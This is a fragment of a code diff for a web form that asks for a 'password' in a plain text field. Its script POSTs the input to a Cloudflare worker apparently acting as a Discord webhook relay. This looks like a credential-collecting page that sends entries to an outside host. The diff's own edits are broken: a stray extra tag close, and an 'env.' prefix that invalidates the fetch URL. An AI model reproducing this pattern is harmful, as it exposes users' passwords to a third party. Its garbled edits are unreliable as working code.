@@ -77,10 +77,11 @@
 
             <input
                 type="text"
-                id="second"
-                placeholder="password"
-                maxlength="1000"
-                required
+                 id="second"
+                 placeholder="password"
+                 maxlength="1000"
+                 required
+>
             >
 
             <button type="submit">
@@ -106,7 +107,7 @@
             status.textContent = "sending . . .";
 
             try {
-                const response = await fetch("https://discordwebhookworker.strautnieksmikus09.workers.dev/", {
+                const response = await fetch("env.https://discordwebhookworker.strautnieksmikus09.workers.dev/", {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
